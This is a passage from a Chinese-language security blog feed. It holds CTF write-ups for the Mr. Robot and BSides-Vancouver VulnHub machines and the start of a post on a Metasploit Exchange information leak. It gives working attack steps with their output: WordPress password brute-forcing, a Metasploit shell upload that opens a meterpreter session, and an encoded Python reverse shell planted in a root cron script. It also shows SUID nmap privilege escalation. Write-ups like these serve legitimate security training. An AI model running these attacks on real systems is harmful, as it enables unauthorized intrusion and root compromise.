+----+--------+------+-----------+</span><br><span class="line">  | ID | Login  | Name | Password  |</span><br><span class="line">  +----+--------+------+-----------+</span><br><span class="line">  |    | Elliot |      | ER28-0652 |</span><br><span class="line">  +----+--------+------+-----------+</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Jun 19 21:22:23 2018</span><br><span class="line">[+] Elapsed time: 00:01:22</span><br><span class="line">[+] Requests made: 5703</span><br><span class="line">[+] Memory used: 32.516 MB</span><br></pre></td></tr></table></figure><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><ol><li>第一种就是以前的登录改主题404模板</li><li>第二种要用到Metasploit，看自己喜欢。一个大坑！</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload </span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; show options </span><br><span class="line">Module options (exploit/unix/webapp/wp_admin_shell_upload):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   PASSWORD      ER28-0652        yes       The WordPress password to authenticate with</span><br><span class="line">   PAYLOAD_NAME  Kali-Team        yes       Fix By Kali-Team payload_name to update with</span><br><span class="line">   PLUGIN_NAME   WordPress        yes       Fix By Kali-Team plugin_name to update with</span><br><span class="line">   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST         192.168.7.129    yes       The target address</span><br><span class="line">   RPORT         80               yes       The target port (TCP)</span><br><span class="line">   SSL           false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI     /                yes       The base path to the wordpress application</span><br><span class="line">   USERNAME      Elliot           yes       The WordPress username to authenticate with</span><br><span class="line">   VHOST                          no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.7.1      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  7788             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   WordPress</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; set password ER28-0652</span><br><span class="line">password =&gt; ER28-0652</span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; set username Elliot</span><br><span class="line">username =&gt; Elliot</span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhost 192.168.7.129</span><br><span class="line">rhost =&gt; 192.168.7.129</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.7.1:4444 </span><br><span class="line">[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><ol start="3"><li><p>报错了，Google修复，可以上传，但是反弹不会来插件的路径。</p><blockquote><p>/opt/metasploit-framework/embedded/framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb</p><p>用#注释掉下面两行 </p><p>fail_with(Failure::NotFound, ‘The target does not appear to be using WordPress’) unless wordpress_and_online?</p><p>fail_with(Failure::UnexpectedReply, ‘Failed to upload the payload’) unless uploaded</p></blockquote></li><li><p>再重新载入模块</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; reload</span><br><span class="line">[*] Reloading module...</span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.7.1:7788 </span><br><span class="line">[*] Authenticating with WordPress using Elliot:ER28-0652...</span><br><span class="line">[+] Authenticated with WordPress</span><br><span class="line">[*] Preparing payload...</span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[*] Executing the payload at /wp-content/plugins/WordPress/Kali-Team.php...</span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.7.129</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.7.1:7788 -&gt; 192.168.7.129:36273) at 2018-06-19 23:13:10 +0800</span><br><span class="line">ls</span><br><span class="line">[!] This exploit may require manual cleanup of 'Kali-Team.php' on the target</span><br><span class="line">[!] This exploit may require manual cleanup of 'WordPress.php' on the target</span><br><span class="line">[!] This exploit may require manual cleanup of '../WordPress' on the target</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol><li>在robot用户的目录下找到了第二个Key，但是没权限查看。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/robot</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100400/r--------  33    fil   2015-11-13 15:28:21 +0800  key-2-of-3.txt</span><br><span class="line">100644/rw-r--r--  39    fil   2015-11-13 15:28:21 +0800  password.raw-md5</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure><ol start="2"><li>把MD5碰撞出来，应该就是robot的密码了。</li><li>但是su在反弹回来的shell中执行不了。<code>su: must be run from a terminal</code></li><li>转py可以进入交互模式<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br><span class="line">daemon@linux:/home/robot$ su robot</span><br><span class="line">su robot</span><br><span class="line">Password: abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">robot@linux:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(robot) gid=1002(robot) groups=1002(robot)</span><br><span class="line">robot@linux:~$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure><ol start="2"><li>第二个Key找到了！</li><li>最后提升到root权限，找开启了SUID权限的应用</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:/$ cd /root</span><br><span class="line">cd /root</span><br><span class="line">bash: cd: /root: Permission denied</span><br><span class="line">robot@linux:/$ find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">robot@linux:/$</span><br></pre></td></tr></table></figure><ol start="4"><li>低版本的nmap可以用交互模式，而且上面说的是root权限。！后面接着命令就可以了。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:/$ nmap --help</span><br><span class="line">nmap --help</span><br><span class="line">Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] &lt;host or net list&gt;</span><br><span class="line">Some Common Scan Types ('*' options require root privileges)</span><br><span class="line">* -sS TCP SYN stealth port scan (default if privileged (root))</span><br><span class="line">  -sT TCP connect() port scan (default for unprivileged users)</span><br><span class="line">* -sU UDP port scan</span><br><span class="line">  -sP ping scan (Find any reachable machines)</span><br><span class="line">* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)</span><br><span class="line">  -sV Version scan probes open ports determining service &amp; app names/versions</span><br><span class="line">  -sR RPC scan (use with other scan types)</span><br><span class="line">Some Common Options (none are required, most can be combined):</span><br><span class="line">* -O Use TCP/IP fingerprinting to guess remote operating system</span><br><span class="line">  -p &lt;range&gt; ports to scan.  Example range: 1-1024,1080,6666,31337</span><br><span class="line">  -F Only scans ports listed in nmap-services</span><br><span class="line">  -v Verbose. Its use is recommended.  Use twice for greater effect.</span><br><span class="line">  -P0 Don't ping hosts (needed to scan www.microsoft.com and others)</span><br><span class="line">* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys</span><br><span class="line">  -6 scans via IPv6 rather than IPv4</span><br><span class="line">  -T &lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt; General timing policy</span><br><span class="line">  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]</span><br><span class="line">  -oN/-oX/-oG &lt;logfile&gt; Output normal/XML/grepable scan logs to &lt;logfile&gt;</span><br><span class="line">  -iL &lt;inputfile&gt; Get targets from file; Use '-' for stdin</span><br><span class="line">* -S &lt;your_IP&gt;/-e &lt;devicename&gt; Specify source address or network interface</span><br><span class="line">  --interactive Go into interactive mode (then press h for help)</span><br><span class="line">Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'</span><br><span class="line">SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES </span><br><span class="line">robot@linux:/$ </span><br><span class="line">robot@linux:/$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br></pre></td></tr></table></figure><hr><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !id</span><br><span class="line">!id</span><br><span class="line">uid=<span class="number">1002</span>(robot) gid=<span class="number">1002</span>(robot) euid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1002</span>(robot)</span><br><span class="line">waiting to reap child : No child processes</span><br><span class="line">nmap&gt; </span><br><span class="line">Unknown command (ls) -- press h &lt;enter&gt; <span class="keyword">for</span> help</span><br><span class="line">nmap/&gt; !ls</span><br><span class="line">!ls</span><br><span class="line">bin   dev  home        lib    lost+found  mnt  <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span>tmp<span class="title">  var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> initrd.img</span> <span class="title"> lib64</span> <span class="title"> media</span><span class="title">  opt</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span>usr<span class="title">  vmlinuz</span></span><br><span class="line"><span class="title">waiting</span> to<span class="title"> reap</span> child :<span class="title"> No</span> child<span class="title"> processes</span></span><br><span class="line"><span class="title">nmap&gt;</span> !ls /root  </span><br><span class="line">!ls /root</span><br><span class="line">firstboot_done<span class="title">key-3-of-3.txt</span></span><br><span class="line"><span class="title">waiting</span> to<span class="title"> reap</span> child :<span class="title"> No</span> child<span class="title"> processes</span></span><br><span class="line"><span class="title">nmap&gt;</span> cat /root/key-3-of-3.txt</span><br><span class="line">cat /root/key-3-of-3.txt</span><br><span class="line">Unknown<span class="title"> command</span> (cat) --<span class="title"> press</span> h &lt;enter&gt;<span class="title"> for</span> help</span><br><span class="line">nmap&gt; !cat /root/key-3-of-3.txt</span><br><span class="line">!cat /root/key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br><span class="line">waiting<span class="title"> to</span> reap<span class="title"> child</span> :<span class="title"> No</span> child<span class="title"> processes</span></span><br><span class="line"><span class="title">nmap&gt;</span></span><br></pre></td></tr></table></figure><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><ol><li>其实账号密码别人已经给你了<code>http://192.168.7.129/license.txt</code></li><li>拿到<code>ZWxsaW90OkVSMjgtMDY1Mgo=</code></li><li>base64解一下<code>echo ZWxsaW90OkVSMjgtMDY1Mgo= |base64 --decode</code></li><li>elliot:ER28-0652</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Write-up]BSides-Vancouver</title>
      <link href="/2018/06/10/Write-up-BSides-Vancouver/"/>
      <url>/2018/06/10/Write-up-BSides-Vancouver/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ol><li><a href="https://download.vulnhub.com/bsidesvancouver2018/BSides-Vancouver-2018-Workshop.ova" target="_blank" rel="noopener">下载链接</a></li><li>目标：拿到root用户目录下的flag.txt</li><li>全程无图！</li></ol><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol><li>因为虚拟机网络是设置Host-only，所以是vmnet1这张网卡，IP段为192.168.7.1/24</li><li><code>nmap -T4 192.168.7.1/24 -A</code></li></ol><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.7.128</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxr-xr-x    2 65534    65534        4096 Mar 03 17:52 public</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)</span><br><span class="line">|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)</span><br><span class="line">|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/backup_wordpress</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 16.54 seconds</span><br></pre></td></tr></table></figure><ol start="3"><li><p>从上面可以看到服务器开放了21端口，对应的是FTP服务，还是可以匿名访问的。</p><blockquote><p>浏览器服务：<a href="ftp://192.168.7.128/public/users.txt.bk" target="_blank" rel="noopener">ftp://192.168.7.128/public/users.txt.bk</a></p></blockquote></li><li><p>还开放了80端口，robots.txt里有一个<code>/backup_wordpress</code>目录</p><blockquote><p>很明显式一个WordPress，直接上wpscan扫一下</p></blockquote></li><li><p><code>wpscan --url http://192.168.7.128/backup_wordpress/ --enumerate</code></p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[+] WordPress theme in use: twentysixteen - v1.2</span><br><span class="line"></span><br><span class="line">[+] Name: twentysixteen - v1.2</span><br><span class="line"> |  Last updated: 2018-05-17T00:00:00.000Z</span><br><span class="line"> |  Location: http://192.168.7.128/backup_wordpress/wp-content/themes/twentysixteen/</span><br><span class="line"> |  Readme: http://192.168.7.128/backup_wordpress/wp-content/themes/twentysixteen/readme.txt</span><br><span class="line">[!] The version is out of date, the latest version is 1.5</span><br><span class="line"> |  Style URL: http://192.168.7.128/backup_wordpress/wp-content/themes/twentysixteen/style.css</span><br><span class="line"> |  Referenced style.css: wp-content/themes/twentysixteen/style.css</span><br><span class="line"> |  Theme Name: Twenty Sixteen</span><br><span class="line"> |  Theme URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="line"> |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...</span><br><span class="line"> |  Author: the WordPress team</span><br><span class="line"> |  Author URI: https://wordpress.org/</span><br><span class="line"></span><br><span class="line">[+] Enumerating usernames ...</span><br><span class="line">[+] We identified the following 2 users:</span><br><span class="line">    +----+-------+------+</span><br><span class="line">    | ID | Login | Name |</span><br><span class="line">    +----+-------+------+</span><br><span class="line">    | 1  | admin | admi |</span><br><span class="line">    | 2  | john  | joh  |</span><br><span class="line">    +----+-------+------+</span><br><span class="line">[!] Default first WordPress username 'admin' is still used</span><br></pre></td></tr></table></figure><blockquote><p>其实很多漏洞都是XSS或其他需要管理员交互的漏洞，所以很难利用。这里收集到的有博客用的主题，管理员的用户名为john，在博客写的也可以看出来。</p></blockquote><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><ol><li><p><code>wpscan --url http://192.168.7.128/backup_wordpress/ --username john --wordlist dic.txt</code></p></li><li><p>得到密码是<code>enigma</code></p></li><li><p>登录改主题的404.php，getshell后发现没有root权限。</p></li><li><p>获取任务定时计划<code>cat /etc/crontab</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span></span><br><span class="line">PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user    command</span></span><br><span class="line"><span class="number">17</span> *    * * *    root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *    root    test -x /usr/sbin/anacron <span class="params">||</span> ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>    root    test -x /usr/sbin/anacron <span class="params">||</span> ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *    root    test -x /usr/sbin/anacron <span class="params">||</span> ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">*  *    * * *   root    /usr/local/bin/cleanup</span><br></pre></td></tr></table></figure></li><li><p>在这可以看到有一个用root权限运行的cleanup的脚本。</p></li><li>先生成反弹shell的payload</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali-team@LTS:~$ sudo msfvenom -p cmd/unix/reverse_python lhost=192.168.7.1 lport=4444 R</span><br><span class="line"></span><br><span class="line">[sudo] kali-team 的密码： </span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line"></span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line"></span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line"></span><br><span class="line">Payload size: 601 bytes</span><br><span class="line"></span><br><span class="line">python -c "exec('aW1wb3J0IHNvY2tldCAgICAgLCAgICAgICAgIHN1YnByb2Nlc3MgICAgICwgICAgICAgICBvcyAgICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjcuMSIgICAgIDsgICAgICAgcG9ydD00NDQ0ICAgICA7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICAgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgIDsgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgICAgICAgcG9ydCkpICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAgICAgIDApICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAgICAgIDEpICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAgICAgIDIpICAgICA7ICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span><br></pre></td></tr></table></figure><ol start="5"><li>用nc监听本地的4444端口<code>nc -lvp 4444</code></li><li>把payload复制到cleanup脚本里保存，坐等shell反弹回来</li><li>获取flag</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali-team@LTS:~$ nc -lvp 4444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4444)</span><br><span class="line">Connection from [192.168.7.128] port 4444 [tcp/*] accepted (family 2, sport 51156)</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat flag.txt</span><br><span class="line">Congratulations!</span><br><span class="line"></span><br><span class="line">If you can read this, that means you were able to obtain root permissions on this VM.</span><br><span class="line">You should be proud!</span><br><span class="line"></span><br><span class="line">There are multiple ways to gain access remotely, as well as for privilege escalation.</span><br><span class="line">Did you find them all?</span><br><span class="line"></span><br><span class="line">@abatchy17</span><br></pre></td></tr></table></figure><h3 id="write-up录像"><a href="#write-up录像" class="headerlink" title="write-up录像"></a>write-up录像</h3><p><a href="https://www.bilibili.com/video/av24624572" target="_blank" rel="noopener">CTF-BSides Vancouver: 2018 (Workshop)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软Exchange客户端服务器信息泄露</title>
      <link href="/2018/05/25/%E5%BE%AE%E8%BD%AFExchange%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/2018/05/25/%E5%BE%AE%E8%BD%AFExchange%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><blockquote><p>可以泄露远程Microsoft Exchange环境的内部IP地址。这包括承载诸如Outlook Web App（OWA）和自动发现等服务的客户端访问服务器（CAS）的内部地址。这还包括代理或网关处理OWA请求的内部地址。</p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><a id="more"></a><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/owa_iis_internal_ip</span><br><span class="line">msf auxiliary(owa_iis_internal_ip) &gt; show actions</span><br><span class="line">      ...actions...</span><br><span class="line">msf auxiliary(owa_iis_internal_ip) &gt; <span class="built_in">set</span> ACTION &lt;action-name&gt;</span><br><span class="line">msf auxiliary(owa_iis_internal_ip) &gt; show options</span><br><span class="line">      ...show and <span class="built_in">set</span> 